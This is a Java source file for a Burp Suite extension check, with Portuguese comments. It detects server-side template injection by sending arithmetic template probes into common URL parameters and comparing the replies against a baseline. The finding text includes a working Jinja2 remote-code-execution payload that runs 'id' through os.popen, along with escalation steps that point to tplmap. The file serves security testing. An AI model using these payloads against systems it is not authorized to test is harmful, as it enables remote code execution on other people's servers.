package com.rx0.burp.scanner.checks;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.rx0.burp.model.Finding;
import com.rx0.burp.model.Severity;
import com.rx0.burp.scanner.VulnCheck;

import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * Server-Side Template Injection: injeta expressões matemáticas em sintaxes
 * de diferentes engines de template (Jinja2/Twig, ERB/Thymeleaf, EL, Freemarker)
 * e verifica se o resultado AVALIADO (ex: "49" de 7*7) aparece na resposta —
 * comparado contra um baseline sem payload, pra evitar falso-positivo de
 * páginas que já continham "49" por coincidência.
 *
 * Criado por Rx0 - @rodrigocoutinho91
 */
public class SstiCheck implements VulnCheck {

    private static final String[] PARAM_NAMES = {"name", "template", "q", "search", "message", "title"};

    // payload -> resultado esperado se o motor de template avaliar a expressão
    private static final Map<String, String> PAYLOADS = new LinkedHashMap<>();
    static {
        PAYLOADS.put("{{7*7}}", "49");           // Jinja2, Twig
        PAYLOADS.put("${7*7}", "49");             // Freemarker, Velocity, JSP EL
        PAYLOADS.put("#{7*7}", "49");             // Thymeleaf, Ruby ERB
        PAYLOADS.put("<%= 7*7 %>", "49");         // ERB, EJS
        PAYLOADS.put("@(7*7)", "49");             // Razor (.NET)
        PAYLOADS.put("{{=7*7}}", "49");           // alguns motores JS
    }

    @Override
    public String nome() {
        return "SSTI — Server-Side Template Injection";
    }

    @Override
    public List<Finding> executar(MontoyaApi api, String baseUrl) {
        List<Finding> achados = new ArrayList<>();
        String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;

        for (String param : PARAM_NAMES) {
            for (Map.Entry<String, String> entry : PAYLOADS.entrySet()) {
                try {
                    String payload = entry.getKey();
                    String esperado = entry.getValue();

                    // Baseline: mesmo parâmetro, com um valor neutro que não deveria produzir "49"
                    String urlBaseline = base + "/?" + param + "=rx0_baseline_neutro";
                    HttpResponse respBaseline = api.http().sendRequest(HttpRequest.httpRequestFromUrl(urlBaseline)).response();
                    boolean jaContinha49 = respBaseline != null && respBaseline.bodyToString() != null
                            && respBaseline.bodyToString().contains(esperado);
                    if (jaContinha49) continue; // página já contém "49" naturalmente, pula esse param pra evitar FP

                    String urlPayload = base + "/?" + param + "=" + URLEncoder.encode(payload, "UTF-8");
                    HttpResponse respPayload = api.http().sendRequest(HttpRequest.httpRequestFromUrl(urlPayload)).response();
                    if (respPayload == null) continue;

                    String body = respPayload.bodyToString();
                    if (body != null && body.contains(esperado) && !body.contains(payload)) {
                        // contém o RESULTADO avaliado (49) mas não o payload cru — ou seja, foi processado pelo template engine
                        achados.add(new Finding(
                                "Possível SSTI no parâmetro '" + param + "'",
                                Severity.CRITICA,
                                urlPayload,
                                "O payload '" + payload + "' foi enviado e a resposta contém o resultado avaliado ('" + esperado +
                                        "') em vez do payload cru — isso indica que o valor é processado por um motor de template " +
                                        "no servidor, o que pode permitir execução remota de código (RCE) dependendo do engine.",
                                "Payload: " + payload + " | Resultado avaliado encontrado: " + esperado,
                                "Nunca passe entrada do usuário diretamente para a renderização de templates. Use templates pré-compilados " +
                                        "com dados apenas como variáveis (nunca como código), e mantenha o motor de template atualizado.",
                                "1) Identifique o engine exato: o payload '" + payload + "' que funcionou indica qual sintaxe é aceita. " +
                                        "2) Use o PayloadsAllTheThings (SSTI) ou o tplmap (https://github.com/epinna/tplmap) apontando pro " +
                                        "parâmetro '" + param + "' pra identificar o engine automaticamente e tentar RCE. 3) Para Jinja2/Twig " +
                                        "(payload {{}}), teste escalar pra RCE com algo como {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}} " +
                                        "(ajuste pro engine certo). 4) Confirme a saída do comando na resposta — isso é execução remota de código."));
                        break; // confirmado nesse param, não precisa testar as outras sintaxes
                    }
                } catch (Exception e) {
                    api.logging().logToError("[Rx0] Erro no check de SSTI (param " + param + "): " + e.getMessage());
                }
            }
        }
        return achados;
    }
}
